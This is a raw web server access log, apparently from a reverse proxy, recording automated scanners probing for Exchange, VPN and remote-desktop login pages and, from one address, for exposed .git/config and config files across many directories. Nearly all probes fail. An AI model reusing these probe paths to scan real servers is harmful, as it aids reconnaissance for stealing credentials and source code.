50.116.32.232 - - [19/Dec/2023:20:45:19 +0000] "GET /owa/auth/errorFE.aspx?httpCode=500 HTTP/2.0" 404 19 "-" "-" 10844 "-" "-" 0ms
50.116.32.232 - - [19/Dec/2023:20:45:19 +0000] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/2.0" 404 19 "-" "-" 10845 "-" "-" 0ms
50.116.32.232 - - [19/Dec/2023:20:45:19 +0000] "GET /owa/auth/logon.aspx HTTP/2.0" 404 19 "-" "-" 10846 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:20:45:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10847 "www@docker" "http://172.18.0.9:80" 1ms
143.244.157.130 - - [19/Dec/2023:20:45:25 +0000] "GET / HTTP/2.0" 404 19 "-" "-" 10848 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:20:45:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10849 "www@docker" "http://172.18.0.9:80" 1ms
45.33.86.104 - - [19/Dec/2023:20:45:40 +0000] "GET /api/v1 HTTP/1.1" 404 19 "-" "-" 10850 "-" "-" 0ms
45.33.86.104 - - [19/Dec/2023:20:45:40 +0000] "GET /api/v1 HTTP/1.1" 404 19 "-" "-" 10851 "-" "-" 0ms
50.116.49.28 - - [19/Dec/2023:20:45:49 +0000] "POST /v1/statement HTTP/1.1" 404 19 "-" "-" 10852 "-" "-" 0ms
139.144.170.246 - - [19/Dec/2023:20:46:03 +0000] "GET /dana-na/nc/nc_gina_ver.txt HTTP/2.0" 404 19 "-" "-" 10853 "-" "-" 0ms
139.144.170.246 - - [19/Dec/2023:20:46:03 +0000] "GET /dana-cached/hc/HostCheckerInstaller.osx HTTP/2.0" 404 19 "-" "-" 10854 "-" "-" 0ms
139.177.202.169 - - [19/Dec/2023:20:46:11 +0000] "GET /RDWeb HTTP/2.0" 404 19 "-" "-" 10855 "-" "-" 0ms
139.177.202.169 - - [19/Dec/2023:20:46:11 +0000] "GET /Remote HTTP/2.0" 404 19 "-" "-" 10856 "-" "-" 0ms
139.177.202.169 - - [19/Dec/2023:20:46:11 +0000] "GET / HTTP/2.0" 404 19 "-" "-" 10857 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:20:46:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10858 "www@docker" "http://172.18.0.9:80" 1ms
68.183.175.173 - - [19/Dec/2023:20:46:20 +0000] "POST /wsman HTTP/2.0" 404 19 "-" "-" 10859 "-" "-" 0ms
50.116.29.99 - - [19/Dec/2023:20:46:27 +0000] "GET /auth.html HTTP/2.0" 404 19 "-" "-" 10860 "-" "-" 0ms
50.116.29.99 - - [19/Dec/2023:20:46:27 +0000] "GET / HTTP/2.0" 404 19 "-" "-" 10861 "-" "-" 0ms
50.116.29.99 - - [19/Dec/2023:20:46:27 +0000] "GET /auth1.html HTTP/2.0" 404 19 "-" "-" 10862 "-" "-" 0ms
50.116.29.99 - - [19/Dec/2023:20:46:27 +0000] "GET /api/sonicos/auth HTTP/2.0" 404 19 "-" "-" 10863 "-" "-" 0ms
50.116.29.99 - - [19/Dec/2023:20:46:27 +0000] "GET /sslvpnLogin.html HTTP/2.0" 404 19 "-" "-" 10864 "-" "-" 0ms
50.116.29.99 - - [19/Dec/2023:20:46:27 +0000] "GET /api/sonicos/tfa HTTP/2.0" 404 19 "-" "-" 10865 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:20:46:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10866 "www@docker" "http://172.18.0.9:80" 0ms
66.228.59.94 - - [19/Dec/2023:20:46:37 +0000] "HEAD / HTTP/1.1" 404 19 "-" "-" 10867 "-" "-" 0ms
66.228.59.94 - - [19/Dec/2023:20:47:06 +0000] "GET / HTTP/2.0" 404 19 "-" "-" 10868 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:20:47:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10869 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:20:47:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10870 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:20:48:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10871 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:20:48:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10872 "www@docker" "http://172.18.0.9:80" 1ms
66.228.59.94 - - [19/Dec/2023:20:48:56 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 10873 "-" "-" 0ms
66.228.59.94 - - [19/Dec/2023:20:48:56 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 10874 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:20:49:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10875 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:20:49:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10876 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:20:50:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10877 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:20:50:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10878 "www@docker" "http://172.18.0.9:80" 1ms
87.236.176.166 - - [19/Dec/2023:20:50:42 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 10879 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:20:51:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10880 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:20:51:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10881 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:20:52:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10882 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:20:52:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10883 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:20:53:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10884 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:20:53:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10885 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:20:54:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10886 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:20:54:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10887 "www@docker" "http://172.18.0.9:80" 1ms
193.187.130.209 - - [19/Dec/2023:20:55:15 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 10888 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:15 +0000] "GET /.git/config HTTP/1.1" 301 17 "-" "-" 10889 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:15 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 10890 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:15 +0000] "GET /.git/config HTTP/1.1" 404 19 "-" "-" 10891 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:15 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 10892 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:15 +0000] "GET /config HTTP/1.1" 301 17 "-" "-" 10893 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:15 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 10894 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:15 +0000] "GET /config HTTP/1.1" 404 19 "-" "-" 10895 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:15 +0000] "GET /git/ HTTP/1.1" 301 17 "-" "-" 10896 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:15 +0000] "GET /git/.git/config HTTP/1.1" 301 17 "-" "-" 10897 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:15 +0000] "GET /git/ HTTP/1.1" 404 19 "-" "-" 10898 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:15 +0000] "GET /git/.git/config HTTP/1.1" 404 19 "-" "-" 10899 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:16 +0000] "GET /git HTTP/1.1" 301 17 "-" "-" 10900 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:16 +0000] "GET /git/config HTTP/1.1" 301 17 "-" "-" 10901 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:16 +0000] "GET /git HTTP/1.1" 404 19 "-" "-" 10902 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:16 +0000] "GET /git/config HTTP/1.1" 404 19 "-" "-" 10903 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:16 +0000] "GET /src/ HTTP/1.1" 301 17 "-" "-" 10904 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:16 +0000] "GET /src/.git/config HTTP/1.1" 301 17 "-" "-" 10905 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:16 +0000] "GET /src/ HTTP/1.1" 404 19 "-" "-" 10906 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:16 +0000] "GET /src/.git/config HTTP/1.1" 404 19 "-" "-" 10907 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:16 +0000] "GET /src HTTP/1.1" 301 17 "-" "-" 10908 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:16 +0000] "GET /src/config HTTP/1.1" 301 17 "-" "-" 10909 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:16 +0000] "GET /src HTTP/1.1" 404 19 "-" "-" 10910 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:16 +0000] "GET /src/config HTTP/1.1" 404 19 "-" "-" 10911 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:16 +0000] "GET /source/ HTTP/1.1" 301 17 "-" "-" 10912 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:16 +0000] "GET /source/ HTTP/1.1" 404 19 "-" "-" 10913 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:16 +0000] "GET /source/.git/config HTTP/1.1" 301 17 "-" "-" 10914 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:16 +0000] "GET /source/.git/config HTTP/1.1" 404 19 "-" "-" 10915 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:16 +0000] "GET /source HTTP/1.1" 301 17 "-" "-" 10916 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:16 +0000] "GET /source HTTP/1.1" 404 19 "-" "-" 10917 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:16 +0000] "GET /source/config HTTP/1.1" 301 17 "-" "-" 10918 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:16 +0000] "GET /sources/ HTTP/1.1" 301 17 "-" "-" 10919 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:16 +0000] "GET /source/config HTTP/1.1" 404 19 "-" "-" 10920 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:16 +0000] "GET /sources/ HTTP/1.1" 404 19 "-" "-" 10921 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:17 +0000] "GET /sources/.git/config HTTP/1.1" 301 17 "-" "-" 10922 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:17 +0000] "GET /sources HTTP/1.1" 301 17 "-" "-" 10923 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:17 +0000] "GET /sources/.git/config HTTP/1.1" 404 19 "-" "-" 10924 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:17 +0000] "GET /sources HTTP/1.1" 404 19 "-" "-" 10925 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:17 +0000] "GET /sources/config HTTP/1.1" 301 17 "-" "-" 10926 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:17 +0000] "GET /admin/ HTTP/1.1" 301 17 "-" "-" 10927 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:17 +0000] "GET /sources/config HTTP/1.1" 404 19 "-" "-" 10928 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:17 +0000] "GET /admin/ HTTP/1.1" 404 19 "-" "-" 10929 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:17 +0000] "GET /admin/.git/config HTTP/1.1" 301 17 "-" "-" 10930 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:17 +0000] "GET /admin HTTP/1.1" 301 17 "-" "-" 10931 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:17 +0000] "GET /admin/.git/config HTTP/1.1" 404 19 "-" "-" 10932 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:17 +0000] "GET /admin HTTP/1.1" 404 19 "-" "-" 10933 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:17 +0000] "GET /admin/config HTTP/1.1" 301 17 "-" "-" 10934 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:17 +0000] "GET /admin/config HTTP/1.1" 404 19 "-" "-" 10935 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:17 +0000] "GET /api/ HTTP/1.1" 301 17 "-" "-" 10936 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:17 +0000] "GET /api/ HTTP/1.1" 404 19 "-" "-" 10937 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:17 +0000] "GET /api/.git/config HTTP/1.1" 301 17 "-" "-" 10938 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:17 +0000] "GET /api/.git/config HTTP/1.1" 404 19 "-" "-" 10939 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:17 +0000] "GET /api HTTP/1.1" 301 17 "-" "-" 10940 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:17 +0000] "GET /api/config HTTP/1.1" 301 17 "-" "-" 10941 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:17 +0000] "GET /api HTTP/1.1" 404 19 "-" "-" 10942 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:17 +0000] "GET /api/config HTTP/1.1" 404 19 "-" "-" 10943 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:17 +0000] "GET /rest/ HTTP/1.1" 301 17 "-" "-" 10944 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:18 +0000] "GET /rest/.git/config HTTP/1.1" 301 17 "-" "-" 10945 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:18 +0000] "GET /rest/ HTTP/1.1" 404 19 "-" "-" 10946 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:18 +0000] "GET /rest/.git/config HTTP/1.1" 404 19 "-" "-" 10947 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:18 +0000] "GET /rest HTTP/1.1" 301 17 "-" "-" 10948 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:18 +0000] "GET /rest HTTP/1.1" 404 19 "-" "-" 10949 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:18 +0000] "GET /rest/config HTTP/1.1" 301 17 "-" "-" 10950 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:18 +0000] "GET /rest/config HTTP/1.1" 404 19 "-" "-" 10951 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:18 +0000] "GET /backend/ HTTP/1.1" 301 17 "-" "-" 10952 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:18 +0000] "GET /backend/ HTTP/1.1" 404 19 "-" "-" 10953 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:18 +0000] "GET /backend/.git/config HTTP/1.1" 301 17 "-" "-" 10954 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:18 +0000] "GET /backend/.git/config HTTP/1.1" 404 19 "-" "-" 10955 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:18 +0000] "GET /backend HTTP/1.1" 301 17 "-" "-" 10956 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:18 +0000] "GET /backend HTTP/1.1" 404 19 "-" "-" 10957 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:18 +0000] "GET /backend/config HTTP/1.1" 301 17 "-" "-" 10958 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:18 +0000] "GET /svc/ HTTP/1.1" 301 17 "-" "-" 10959 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:18 +0000] "GET /backend/config HTTP/1.1" 404 19 "-" "-" 10960 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:18 +0000] "GET /svc/ HTTP/1.1" 404 19 "-" "-" 10961 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:18 +0000] "GET /svc/.git/config HTTP/1.1" 301 17 "-" "-" 10962 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:18 +0000] "GET /svc HTTP/1.1" 301 17 "-" "-" 10963 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:18 +0000] "GET /svc/.git/config HTTP/1.1" 404 19 "-" "-" 10964 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:18 +0000] "GET /svc HTTP/1.1" 404 19 "-" "-" 10965 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:19 +0000] "GET /svc/config HTTP/1.1" 301 17 "-" "-" 10966 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:19 +0000] "GET /service/ HTTP/1.1" 301 17 "-" "-" 10967 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:19 +0000] "GET /svc/config HTTP/1.1" 404 19 "-" "-" 10968 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:19 +0000] "GET /service/ HTTP/1.1" 404 19 "-" "-" 10969 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:19 +0000] "GET /service/.git/config HTTP/1.1" 301 17 "-" "-" 10970 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:19 +0000] "GET /service/.git/config HTTP/1.1" 404 19 "-" "-" 10971 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:19 +0000] "GET /service HTTP/1.1" 301 17 "-" "-" 10972 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:19 +0000] "GET /service HTTP/1.1" 404 19 "-" "-" 10973 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:19 +0000] "GET /service/config HTTP/1.1" 301 17 "-" "-" 10974 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:19 +0000] "GET /service/config HTTP/1.1" 404 19 "-" "-" 10975 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:19 +0000] "GET /services/ HTTP/1.1" 301 17 "-" "-" 10976 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:19 +0000] "GET /services/.git/config HTTP/1.1" 301 17 "-" "-" 10977 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:19 +0000] "GET /services/ HTTP/1.1" 404 19 "-" "-" 10978 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:19 +0000] "GET /services/.git/config HTTP/1.1" 404 19 "-" "-" 10979 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:19 +0000] "GET /services HTTP/1.1" 301 17 "-" "-" 10980 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:19 +0000] "GET /services/config HTTP/1.1" 301 17 "-" "-" 10981 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:19 +0000] "GET /services HTTP/1.1" 404 19 "-" "-" 10982 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:19 +0000] "GET /services/config HTTP/1.1" 404 19 "-" "-" 10983 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:19 +0000] "GET /app/ HTTP/1.1" 301 17 "-" "-" 10984 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:19 +0000] "GET /app/.git/config HTTP/1.1" 301 17 "-" "-" 10985 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:19 +0000] "GET /app/ HTTP/1.1" 404 19 "-" "-" 10986 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:19 +0000] "GET /app/.git/config HTTP/1.1" 404 19 "-" "-" 10987 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:20 +0000] "GET /app HTTP/1.1" 301 17 "-" "-" 10988 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:20 +0000] "GET /app/config HTTP/1.1" 301 17 "-" "-" 10989 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:20 +0000] "GET /app HTTP/1.1" 404 19 "-" "-" 10990 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:20 +0000] "GET /app/config HTTP/1.1" 404 19 "-" "-" 10991 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:20 +0000] "GET /data/ HTTP/1.1" 301 17 "-" "-" 10992 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:20 +0000] "GET /data/.git/config HTTP/1.1" 301 17 "-" "-" 10993 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:20 +0000] "GET /data/ HTTP/1.1" 404 19 "-" "-" 10994 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:20 +0000] "GET /data/.git/config HTTP/1.1" 404 19 "-" "-" 10995 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:20 +0000] "GET /data/config HTTP/1.1" 301 17 "-" "-" 10996 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:20 +0000] "GET /data HTTP/1.1" 301 17 "-" "-" 10997 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:20:55:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10998 "www@docker" "http://172.18.0.9:80" 1ms
193.187.130.209 - - [19/Dec/2023:20:55:20 +0000] "GET /data/config HTTP/1.1" 404 19 "-" "-" 10999 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:20 +0000] "GET /data HTTP/1.1" 404 19 "-" "-" 11000 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:20 +0000] "GET /bak/.git/config HTTP/1.1" 301 17 "-" "-" 11001 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:20 +0000] "GET /bak/ HTTP/1.1" 301 17 "-" "-" 11002 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:20 +0000] "GET /bak/.git/config HTTP/1.1" 404 19 "-" "-" 11003 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:20 +0000] "GET /bak/ HTTP/1.1" 404 19 "-" "-" 11004 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:20 +0000] "GET /bak/config HTTP/1.1" 301 17 "-" "-" 11005 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:20 +0000] "GET /bak HTTP/1.1" 301 17 "-" "-" 11006 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:20 +0000] "GET /bak/config HTTP/1.1" 404 19 "-" "-" 11007 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:20 +0000] "GET /bak HTTP/1.1" 404 19 "-" "-" 11008 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:20 +0000] "GET /backup/.git/config HTTP/1.1" 301 17 "-" "-" 11009 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:20 +0000] "GET /backup/ HTTP/1.1" 301 17 "-" "-" 11010 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:21 +0000] "GET /backup/.git/config HTTP/1.1" 404 19 "-" "-" 11011 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:21 +0000] "GET /backup/ HTTP/1.1" 404 19 "-" "-" 11012 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:21 +0000] "GET /backup/config HTTP/1.1" 301 17 "-" "-" 11013 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:21 +0000] "GET /backup HTTP/1.1" 301 17 "-" "-" 11014 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:21 +0000] "GET /backup/config HTTP/1.1" 404 19 "-" "-" 11015 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:21 +0000] "GET /backup HTTP/1.1" 404 19 "-" "-" 11016 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:21 +0000] "GET /test/ HTTP/1.1" 301 17 "-" "-" 11017 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:21 +0000] "GET /test/.git/config HTTP/1.1" 301 17 "-" "-" 11018 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:21 +0000] "GET /test/ HTTP/1.1" 404 19 "-" "-" 11019 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:21 +0000] "GET /test/.git/config HTTP/1.1" 404 19 "-" "-" 11020 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:21 +0000] "GET /test HTTP/1.1" 301 17 "-" "-" 11021 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:21 +0000] "GET /test/config HTTP/1.1" 301 17 "-" "-" 11022 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:21 +0000] "GET /test HTTP/1.1" 404 19 "-" "-" 11023 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:21 +0000] "GET /test/config HTTP/1.1" 404 19 "-" "-" 11024 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:21 +0000] "GET /temp/ HTTP/1.1" 301 17 "-" "-" 11025 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:21 +0000] "GET /temp/.git/config HTTP/1.1" 301 17 "-" "-" 11026 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:21 +0000] "GET /temp/ HTTP/1.1" 404 19 "-" "-" 11027 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:21 +0000] "GET /temp/.git/config HTTP/1.1" 404 19 "-" "-" 11028 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:21 +0000] "GET /temp HTTP/1.1" 301 17 "-" "-" 11029 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:21 +0000] "GET /temp HTTP/1.1" 404 19 "-" "-" 11030 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:21 +0000] "GET /temp/config HTTP/1.1" 301 17 "-" "-" 11031 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:21 +0000] "GET /temp/config HTTP/1.1" 404 19 "-" "-" 11032 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:21 +0000] "GET /tmp/ HTTP/1.1" 301 17 "-" "-" 11033 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:22 +0000] "GET /tmp/ HTTP/1.1" 404 19 "-" "-" 11034 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:22 +0000] "GET /tmp/.git/config HTTP/1.1" 301 17 "-" "-" 11035 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:22 +0000] "GET /tmp HTTP/1.1" 301 17 "-" "-" 11036 "web-to-websecure@internal" "-" 0ms
